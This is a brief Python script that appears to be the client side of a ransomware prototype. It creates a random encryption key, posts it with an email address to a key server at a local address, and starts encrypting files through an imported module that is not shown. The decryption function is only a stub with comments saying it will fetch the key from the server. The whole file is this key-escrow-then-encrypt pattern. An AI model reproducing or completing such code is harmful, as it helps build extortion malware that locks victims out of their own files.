#!/usr/bin/env python

import base64
import encryption_decryption as enc_dec
import requests


def encrypt(email):
	key = enc_dec.generateEncryptionKey(16)

	print(key)
	b64Key = base64.b64encode(key)

	stringB64 = b64Key.decode()
	#print(stringB64)
	#d = base64.b64decode(stringB64)

	#send to server
	r = requests.post("http://127.0.0.1:5000/savekey", json = {'email' : email, 'privatekey' : b64Key.decode()})
	#print(r.status_code)

	enc_dec.beginFileEncryption(key, enc_dec.encrypt)
	#update loading bar?
	


def decrypt(email):
	print("decrypting")

	#fetch key from server
	#proceed with decryption



if __name__ == '__main__':
	encrypt("rayan@gmail.com")